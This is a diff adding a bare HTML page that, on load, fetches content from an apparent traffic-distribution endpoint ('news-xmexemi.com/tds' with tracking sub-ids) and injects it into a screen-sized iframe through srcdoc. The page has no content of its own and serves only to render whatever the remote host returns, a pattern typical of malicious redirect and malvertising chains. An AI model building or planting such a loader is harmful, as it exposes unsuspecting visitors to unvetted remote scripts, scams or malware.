@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+
+</head>
+<body>
+
+  <iframe id="id1" src="" height="768" width="1366" ></iframe>
+
+  <script>
+$.get("https://news-xmexemi.com/tds?id=1259169006&p1=sub1&p2=sub2&p3=sub3&p4=sub4", function(data, status){
+       $("#id1").attr("srcdoc", data);
+        
+});
+</script>
+
+</body>
+</html>
